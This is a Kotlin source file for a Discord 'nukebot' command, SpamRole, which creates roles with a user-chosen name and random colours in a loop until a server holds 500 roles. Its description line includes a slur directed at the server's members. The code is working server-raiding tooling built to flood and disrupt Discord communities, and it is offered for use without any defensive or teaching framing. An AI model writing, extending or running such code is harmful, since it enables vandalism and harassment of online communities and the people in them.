package thenano.nukebot.bot.command.commands

import net.dv8tion.jda.api.events.message.MessageReceivedEvent
import thenano.nukebot.bot.command.CommandListener
import java.awt.Color
import kotlin.random.Random

@CommandListener.Info("!sr <roleName>","Create lots of role and tag all gay in this server",false)
class SpamRole : CommandListener() {

    @Throws(RuntimeException::class)
    override fun onEvent(event: MessageReceivedEvent) {
        if (onInit(event)) return
        if (messageRaw.startsWith("!sr")) {
            try {
                message.reply("Spamming Role").queue()
                val content = messageRaw.substring(messageRaw.indexOf(" ")+1)
                while (guild.roles.size < 500) {
                    guild.createRole().setName(content).setColor(randomColor()).queue()
                }
            } catch (e:StringIndexOutOfBoundsException) {
                message.reply("Wrong Type, Plz Enter !mr <content>").queue()
            }
        }
    }

    fun randomColor():Color {
        val random = Random
        val rgba:MutableList<Int> = mutableListOf()
        for (i in 0..2) {
            random.nextInt(0, 255)
            rgba.add(random.nextInt(0,255))
        }
        println(rgba.get(0))
        println(rgba.get(1))
        println(rgba.get(2))
        return Color(rgba.get(0),rgba.get(1),rgba.get(2))
    }
}